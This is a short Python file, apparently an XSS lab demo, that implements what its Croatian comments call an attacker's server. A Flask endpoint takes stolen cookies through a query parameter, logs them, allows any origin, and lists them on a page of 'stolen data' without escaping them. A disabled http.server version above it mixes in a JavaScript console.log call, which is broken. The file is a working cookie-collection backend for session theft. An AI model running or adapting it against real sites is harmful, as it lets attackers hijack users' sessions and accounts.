'''
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("UKRADENO:", self.path)
        console.log("UKRADENO:", self.path)
        self.send_response(200)
        self.end_headers()

HTTPServer(("localhost", 9000), Handler).serve_forever()    '''

from flask import Flask, request, Response

app = Flask(__name__)

# u memoriji cuvamo sve "ukradene" podatke
log_entries = []


@app.route("/log")
def log():
    cookie = request.args.get("c", "")
    log_entries.append(cookie)
    print("UKRADENO:", cookie, flush=True)

    resp = Response("logged")
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.route("/")
def home():
    if log_entries:
        items = "".join(f"<li>{entry}</li>" for entry in log_entries)
    else:
        items = "<li>(jos nema ukradenih podataka)</li>"

    return f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Napadacev log</title></head>
<body style="font-family: system-ui, sans-serif; max-width: 600px; margin: 60px auto;">
  <h1>Ukradeni podaci (napadacev server)</h1>
  <ul>{items}</ul>
  <p><a href="/">Osvjezi</a></p>
</body>
</html>"""


if __name__ == "__main__":
    app.run(port=9000)
